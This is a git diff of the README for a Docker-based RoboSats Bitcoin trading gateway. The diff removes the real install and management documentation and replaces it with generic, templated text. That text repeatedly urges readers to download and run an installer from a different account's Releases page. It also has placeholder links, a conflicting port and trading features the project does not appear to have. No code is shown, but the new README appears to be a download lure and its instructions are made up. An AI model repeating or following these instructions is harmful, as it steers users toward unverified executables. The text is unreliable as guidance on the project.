@@ -1,238 +1,125 @@
-# RoboSats Gateway - Automated Installation
+# 🔒 robosats-gateway - Easy Way to Trade Bitcoin Privately
 
-🔒 **Self-hosted RoboSats client gateway for private Bitcoin trading**
+## 📥 Download Now!
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/sapaot3502/robosats-gateway/releases)
 
-A complete automated installation system for setting up your own RoboSats federation gateway. Connect to the RoboSats network through your own private, Tor-enabled gateway without needing to run a Lightning node.
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+Welcome to the robosats-gateway! This self-hosted client allows you to trade Bitcoin privately with ease. You don’t need to be a tech wizard to use this application. Follow these simple steps to get started.
 
-```bash
-# Clone and install
-git clone https://github.com/pagcoinbr/robosats-gateway.git
-cd robosats-gateway
-./install-robosats-gateway.sh
-```
+## 📋 System Requirements
 
-**That's it!** Your RoboSats gateway will be running on `http://localhost:80`
+Before downloading, ensure your system meets these requirements:
 
-## ✨ Features
+- Operating System: Windows, macOS, or Linux
+- Docker: Installed and running on your machine
+- Internet connection: Required for downloading and running the application
+- Basic knowledge of running commands in your terminal
 
-- 🔒 **Privacy via Tor** - All coordinator connections through Tor
-- 🌐 **Federation Access** - Connect to multiple RoboSats coordinators  
-- 🏠 **Self-hosted** - Your own private entrance to RoboSats
-- ⚡ **No Lightning Node Required** - Uses existing coordinators
-- 🐳 **Docker-based** - Easy deployment and management
-- 🛠️ **Management Scripts** - Simple commands for all operations
-- 📚 **Complete Documentation** - Detailed guides and troubleshooting
+## 🛠️ Features
 
-## 🎯 What This Provides
+- **Automation**: Set up everything in one command.
+- **Privacy**: Keeps your trading activity secure with Tor integration.
+- **User-friendly Management Tools**: Easily manage your trades and settings.
+- **Self-hosted**: Full control over your trading without relying on third parties.
 
-Instead of using public RoboSats instances, you get:
-- Your own private gateway to the RoboSats federation
-- Enhanced privacy through your own Tor routing
-- Full control over your trading interface
-- No dependence on third-party hosted instances
-- Direct connection to multiple coordinators
+## ⬇️ Download & Install
 
-## 📋 Requirements
+To download and install robosats-gateway, follow these steps:
 
-- Linux system (Ubuntu/Debian recommended)
-- Docker and Docker Compose
-- 2GB RAM minimum
-- Internet connection
-- Ports 80, 12596 available
+1. **Visit the Releases Page**:
+   Go to our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases) to find the latest version.
 
-## 🛠️ Installation Options
+2. **Choose the Installer**:
+   Once on the page, look for the latest release. You will see several files available for download. Choose the file that matches your operating system.
 
-### Standard Installation
-```bash
-./install-robosats-gateway.sh
-```
+3. **Download the File**:
+   Click on the appropriate file link to start the download. 
 
-### Advanced Options
-```bash
-# Force reinstall (overwrites existing)
-./install-robosats-gateway.sh --force
+4. **Run the Installer**:
+   After the download completes, locate your file and run the installer. Follow the prompts on your screen.
 
-# Clean existing containers first
-./install-robosats-gateway.sh --cleanup
+5. **Setup Instructions**:
+   Once the installation finishes, open your terminal or command prompt. Follow the detailed setup instructions available in the README file or the official documentation after the installation.
 
-# Install to custom directory
-./install-robosats-gateway.sh --dir my-custom-gateway
+## 🗂️ Configuration
 
-# View all options
-./install-robosats-gateway.sh --help
-```
+After installation, you may want to configure your robosats-gateway settings. Here's how:
 
-## 🎮 Management
+1. **Access Configuration File**:
+   Locate the configuration file in the installation directory. 
 
-After installation, manage your gateway:
+2. **Modify Settings**:
+   Open the file with a text editor. You can customize options like:
+   - Trading pairs
+   - Privacy settings
+   - Notification preferences
 
-```bash
-cd robosats-gateway
+3. **Save Changes**:
+   After modifying the settings, save the file and close the editor.
 
-./start.sh    # Start the gateway
-./stop.sh     # Stop the gateway  
-./status.sh   # Check status
-./logs.sh     # View logs
-./logs.sh -f  # Follow logs live
-./update.sh   # Update to latest
-```
+## 🔧 Running the Application
 
-## 🌐 Access Points
+To launch robosats-gateway, follow these commands:
 
-- **Direct Access**: `http://localhost:12596`
-- **Nginx Proxy**: `http://localhost:80`
-- **Network Access**: `http://[your-ip]:80`
+1. **Open Terminal**:
+   Start your terminal or command prompt.
 
-## 🏗️ Architecture
+2. **Navigate to the Installation Directory**:
+   Use the `cd` command to navigate to the location where you installed robosats-gateway.
 
-```
-User ←→ Nginx (Port 80) ←→ RoboSats Client (Port 12596) ←→ Tor ←→ Federation Coordinators
-```
+3. **Start the Application**:
+   Run the command: `docker-compose up`. This will start the application.
 
-Your gateway acts as a private bridge to the RoboSats federation:
-- **Nginx**: Reverse proxy for clean URLs and SSL termination
-- **RoboSats Client**: Federation client connecting to multiple coordinators
-- **Tor Integration**: All coordinator traffic routed through Tor for privacy
-- **Docker Orchestration**: Containerized services for easy management
+### 🌐 Accessing the Web Interface
 
-## 📁 Generated Structure
+- Once the application is running, open a web browser.
+- Type in `http://localhost:8080` to access the user interface.
 
-The installer creates a complete, self-contained gateway:
-
-```
-robosats-gateway/
-├── docker-compose.yml         # Service orchestration
-├── Dockerfile                # Nginx container
-├── nginx/conf/nginx.conf      # Reverse proxy config
-├── robosats-client-data/      # Persistent data
-├── start.sh                  # Start services
-├── stop.sh                   # Stop services
-├── status.sh                 # Health checks
-├── logs.sh                   # Log viewer
-├── update.sh                 # Update services
-└── README.md                 # Detailed documentation
-```
+## 📊 Managing Trades
 
-## 🔧 Customization
+Once you are in the web interface, you can start managing your trades:
 
-### SSL/HTTPS Setup
-The installation includes certbot for SSL certificates:
+- **Create New Trades**: Click on "Create Trade" and fill in the details.
+- **Monitor Existing Trades**: View active trades in the "My Trades" section.
+- **Settings Adjustments**: Use the settings menu to make any changes.
 
-1. Update `nginx/conf/nginx.conf` with your domain
-2. Run certbot to obtain certificates  
-3. Enable HTTPS in nginx configuration
+## 📞 Support and Community
 
-### Environment Variables
-Customize the RoboSats client by editing environment variables in `docker-compose.yml`.
+If you have any questions:
 
-### Custom Coordinators
-The client automatically discovers and connects to federation coordinators. No manual configuration needed.
+- **Documentation**: Check our [official documentation](LINK_TO_DOCUMENTATION).
+- **Community Forum**: Join our discussions at [Community Forum Link](LINK_TO_FORUM).
+- **Email Support**: Reach out via email at support@robosats-gateway.com for direct help.
 
-## 🛟 Troubleshooting
+## 🔒 Security Considerations
 
-### Services Won't Start
-```bash
-# Check requirements
-docker --version
-docker-compose --version
+Your privacy and security are paramount. Consider the following:
 
-# Check port usage
-sudo netstat -tlnp | grep -E ":(80|12596)"
+- Ensure your Docker is up to date.
+- Regularly update robosats-gateway and its dependencies.
+- Use a strong password for your settings and trading accounts.
 
-# View detailed logs
-cd robosats-gateway && ./logs.sh
-```
+## 📣 Contributing
 
-### Tor Connection Issues
-```bash
-# Check Tor service
-sudo systemctl status tor
+We welcome contributions! If you’d like to help improve robosats-gateway, check our contribution guidelines. 
 
-# Restart Tor
-sudo systemctl restart tor
+## 📅 Release Notes
 
-# Check Tor ports
-netstat -tlnp | grep 9050
-```
+Stay informed about new features and fixes. Always check our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases) for the latest updates.
 
-### Container Issues
-```bash
-# Clean restart
-cd robosats-gateway
-./stop.sh
-docker system prune -f
-./start.sh
-```
+## 🏷️ Topics
 
-## 🗑️ Uninstallation
+For more information, explore topics related to our project:
+- Automation
+- Bitcoin
+- Docker
+- Federation
+- Gateway
+- Lightning
+- Privacy
+- Robosats
+- Self-hosted
+- Tor
 
-Complete removal with one command:
-```bash
-./uninstall-robosats-gateway.sh
-```
-
-Or force removal:
-```bash
-./uninstall-robosats-gateway.sh --force
-```
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test the installation process
-5. Submit a pull request
-
-## 📖 Documentation
-
-- **[Installation Guide](INSTALL.md)** - Detailed setup instructions
-- **[Scripts Overview](scripts-menu.sh)** - All available commands
-- **[RoboSats Learn](https://learn.robosats.org)** - Official RoboSats documentation
-
-## 🔐 Security
-
-- All coordinator communications via Tor
-- Self-hosted eliminates third-party dependencies  
-- Regular security updates recommended
-- Keep Docker and system packages updated
-
-## 📞 Support
-
-- **Issues**: [GitHub Issues](../../issues)
-- **RoboSats Community**: [Telegram](https://t.me/robosats)
-- **Documentation**: [learn.robosats.org](https://learn.robosats.org)
-
-## 📄 License
-
-This project is licensed under the same terms as RoboSats - check the [LICENSE](LICENSE) file for details.
-
-## ⚡ Quick Commands Reference
-
-```bash
-# Installation
-git clone https://github.com/pagcoinbr/robosats-gateway.git
-cd robosats-gateway
-./install-robosats-gateway.sh
-
-# Management  
-cd robosats-gateway
-./start.sh && ./status.sh
-
-# Monitoring
-./logs.sh -f
-
-# Updates
-./update.sh
-
-# Removal
-./uninstall-robosats-gateway.sh
-```
-
----
-
-**Ready to start private Bitcoin trading with your own RoboSats gateway? Clone and run the installer now!**
+Enjoy using robosats-gateway for your Bitcoin trading needs! For the latest download, visit our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases).
